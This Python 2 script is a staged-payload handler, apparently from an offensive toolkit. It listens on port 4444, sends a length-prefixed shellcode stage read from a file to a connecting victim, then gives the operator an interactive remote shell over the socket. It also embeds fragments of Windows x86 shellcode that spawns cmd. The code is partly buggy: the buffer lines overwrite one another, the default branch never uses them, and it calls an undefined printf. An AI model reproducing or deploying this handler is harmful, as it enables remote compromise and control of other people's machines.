import socket
import struct
import threading
import sys
import select


def DoMyShit():

    host = "192.168.11.100"
    port = 4444
    shellcodeFileName = "staged.mem"

    shellcode = None

    with open(shellcodeFileName, 'r') as f:
        shellcode = f.read()

    if shellcode == None:
        print("No shellcode loaded. Using default shellcode.")

        buf = ""
        buf = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b"
        buf = "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0"
        buf = "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57"
        buf = "\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01"
        buf = "\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b"
        buf = "\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4"
        buf = "\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        buf = "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        buf = "\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d"
        buf = "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56"
        buf = "\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
        buf = "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
        buf = "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff"
        buf = "\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"

        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Socket created")

    s.bind((host, port))
    print("Binded to {0}:{1}".format(host, port))

    s.listen(1)
    print("Now listening...")

    # first connect - send size    
    c, addr = s.accept()

    print("Connected to {0}".format(addr))

    #once we're connected, let's send the payload length    
    payloadsize = len(shellcode)
    c.send(struct.pack("<I", payloadsize))
    print("Payload size {0} sent...".format(payloadsize))

    #now we wait
    c.send(shellcode)
    print("Final payload sent")

    while 1:
        socket_list = [sys.stdin, c]
        read_sockets, write_sockets, error_sockets = select.select(socket_list, [], [])

        for sock in read_sockets:
            if sock == c:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.write(data)
            else:
                msg = sys.stdin.readline()
                c.send(msg)
        

    # #spawn threads for shell
    # sendThread = threading.Thread(target = send, args=(c,))
    # recvThread = threading.Thread(target = recv, args=(c,))

    # sendThread.start()
    # recvThread.start()

    # sendThread.join()
    
    c.close()
    print("Connection closed for {0}".format(addr))

    s.close()
    printf("Socket closed")

def send(c):
    while True:
        print("Input:")
        cmd = raw_input()
        c.send(cmd)


def recv(c):
    print("Starting recv()...")
    while True:
        data = c.recv(1024)
        print data

if __name__ == '__main__':
    DoMyShit()